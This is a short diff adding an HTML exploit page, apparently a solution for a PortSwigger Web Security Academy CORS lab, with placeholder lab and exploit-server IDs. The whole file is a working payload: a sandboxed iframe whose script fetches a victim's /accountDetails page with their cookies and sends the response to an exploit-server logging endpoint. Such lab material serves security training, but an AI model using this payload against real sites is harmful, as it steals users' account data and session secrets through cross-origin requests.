@@ -1,0 +1,10 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+    fetch('https://YOUR-LAB-ID.web-security-academy.net/accountDetails', {
+        method: 'GET',
+        credentials: 'include'
+    }).then(response => response.text())
+      .then(data =>{
+        fetch('https://exploit-YOUR-EXPLOIT-ID.exploit-server.net/log?data=' + encodeURIComponent(data));
+    })
+    .catch(error => console.error('Error:', error));
+</script>"></iframe>
